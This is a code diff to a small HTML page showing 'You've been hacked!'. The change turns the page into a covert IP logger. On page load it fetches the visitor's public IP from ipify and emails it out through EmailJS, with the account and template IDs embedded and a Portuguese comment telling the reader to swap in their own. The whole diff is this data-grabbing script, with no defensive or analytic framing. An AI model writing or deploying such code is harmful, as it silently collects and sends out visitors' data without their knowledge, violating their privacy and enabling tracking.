@@ -4,13 +4,32 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Testezinho</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 </head>
 <body>
     <h1>You've been hacked!</h1>
     <script>
+        emailjs.init("7mGyXjxE2S5_0cbL9"); // Substitua com o seu EmailJS User ID
+
         fetch('https://api.ipify.org/?format=json')
             .then(results => results.json())
-            .then(data => console.log(data.ip))
+            .then(data => {
+                const ipAddress = data.ip;
+
+                // Enviar email usando EmailJS
+                const templateParams = {
+                    ipAddress: ipAddress
+                };
+
+                emailjs.send("service_tbk9dlg", "template_ry4jy0l", templateParams)
+                    .then(response => {
+                        console.log('Email sent successfully:', response);
+                    }, error => {
+                        console.error('Error sending email:', error);
+                    });
+                console.log(ipAddress)
+            })
+            .catch(error => console.error('Error getting IP address:', error));
     </script>
 </body>
 </html>
